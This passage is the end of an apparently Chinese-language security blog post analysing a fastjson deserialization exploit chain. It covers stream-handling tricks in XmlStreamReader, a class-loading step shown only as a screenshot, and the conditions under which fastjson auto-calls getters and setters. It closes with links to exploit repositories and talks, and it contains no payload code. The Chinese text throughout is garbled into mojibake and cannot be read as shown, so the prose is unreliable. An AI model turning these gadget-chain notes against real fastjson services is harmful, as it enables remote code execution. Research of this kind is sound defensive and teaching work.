<p>æ¥ç€ä¸‹å›¾1<code>in.read()</code>è¿™é‡Œè¯»å–æ¯ä¸ªå€¼ï¼Œè¶…è¿‡4ä¸ªå€¼åå›åˆ°ä¸‹å›¾2ä¸­è·å–å¯¹åº”çš„å€¼ï¼Œ<strong>æ¯æ¬¡posä¼š+1</strong>ã€‚<code>count</code>åˆ™æ˜¯æˆ‘ä»¬å†™å…¥å­—ç¬¦çš„é•¿åº¦ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦è¿›å…¥<code>fill()</code>ï¼ˆé‡Œé¢åç»­ä¼šè°ƒç”¨TeeInputStream#readè¿›è¡Œclose()å…³é—­æµï¼‰ã€‚è€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°å¦‚æœcountè¿™é‡Œè¶…è¿‡**<code>15</code><strong>ï¼Œå›¾1forèµ°å®Œ<code>posæœ€å¤šä¸º15</code>å°±ä¼šå¯¼è‡´</strong>è¿›å…¥ä¸äº†fill()**ï¼Œå¯¼è‡´æ²¡æœ‰close()</p>
<p>å›¾1</p>
<p><img loading="lazy" src="images/image-20250630171958453.png" alt="image-20250630171958453"  />
</p>
<p>å›¾2</p>
<p><img loading="lazy" src="images/image-20250630171900980.png" alt="image-20250630171900980"  />
</p>
<ul>
<li>ç„¶åå°±æ˜¯å…¶å®æ˜¯éœ€è¦è°ƒç”¨ä¸¤æ¬¡<code>getBOM()</code>çš„ï¼Œè€Œ$refæˆ‘çŒœæµ‹åº”è¯¥åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œè€ŒXmlStreamReaderåˆå§‹åŒ–æ­£å¥½èƒ½è°ƒç”¨ä¸¤æ¬¡<code>getBOM()</code></li>
</ul>
<p><img loading="lazy" src="images/image-20250630181058377.png" alt="image-20250630181058377"  />
</p>
<h3 id="step4-åŠ è½½class">Step4 åŠ è½½class<a hidden class="anchor" aria-hidden="true" href="#step4-åŠ è½½class">#</a></h3>
<p><img loading="lazy" src="images/image-20250701172053625.png" alt="image-20250701172053625"  />
</p>
<p>çœ‹å®Œæ„Ÿè§‰è¿™ä¸ªåˆ©ç”¨æ„é€ ï¼Œç»†æ€ææã€‚æŒ–æ˜å»è¿™ä¸ªæ„é€ çš„ä½¬å¤ªçŒ›äº†!^!</p>
<h1 id="featureç»“è®º"><strong>Feature(ç»“è®º):</strong><a hidden class="anchor" aria-hidden="true" href="#featureç»“è®º">#</a></h1>
<p>æ‘˜å–äº <a href="https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d">https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d</a></p>
<ol>
<li>å…³äºgetterå’Œsetter
<ol>
<li>getterè‡ªåŠ¨è°ƒç”¨æ¡ä»¶ï¼š
<ol>
<li>æ–¹æ³•åé•¿åº¦å¤§äº4</li>
<li>éé™æ€æ–¹æ³•</li>
<li>ä»¥getå¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™</li>
<li>æ— å‚æ•°ä¼ å…¥</li>
<li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollection Map AtomicBoolean AtomicInteger AtomicLong</li>
</ol>
</li>
<li>setterè‡ªåŠ¨è°ƒç”¨éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š
<ol>
<li>æ–¹æ³•åé•¿åº¦å¤§äº4</li>
<li>éé™æ€æ–¹æ³•</li>
<li>è¿”å›å€¼ä¸ºvoidæˆ–è€…å½“å‰ç±»</li>
<li>ä»¥setå¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™</li>
<li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li>
</ol>
</li>
</ol>
</li>
<li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰setteræ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨<code>Feature.SupportNonPublicField</code>å‚æ•°</li>
<li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾getter/setteræ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•°<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>æ–¹æ³•ï¼Œä¼šå¿½ç•¥<code>_ -</code>å­—ç¬¦ä¸²</li>
<li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœFieldç±»å‹ä¸ºbyte[]ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>è¿›è¡Œbase64è§£ç ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œbase64ç¼–ç </li>
</ol>
<h2 id="ç‰ˆæœ¬æ¢æµ‹">ç‰ˆæœ¬æ¢æµ‹<a hidden class="anchor" aria-hidden="true" href="#ç‰ˆæœ¬æ¢æµ‹">#</a></h2>
<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
<blockquote>
<p>å‚è€ƒï¼š</p>
<p><a href="https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d">https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d</a></p>
<p><a href="https://www.anquanke.com/post/id/232774#h3-18">https://www.anquanke.com/post/id/232774#h3-18</a></p>
<p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></p>
<p><a href="https://tttang.com/archive/1579/#toc_1268">https://tttang.com/archive/1579/#toc_1268</a></p>
<p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
<p><a href="https://y4er.com/posts/fastjson-1.2.80/">https://y4er.com/posts/fastjson-1.2.80/</a></p>
<p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ</a></p>
<p>è®®ä¼š</p>
<p><a href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf</a></p>
<p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/%E5%8E%9F%E7%94%9Fjdk/java-file%E5%8D%8F%E8%AE%AE-%E7%AE%80%E6%9E%90/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>java fileåè®® ç®€æ</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>jdk7u21&amp; 8u20 æ·±åº¦åˆ†æ</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
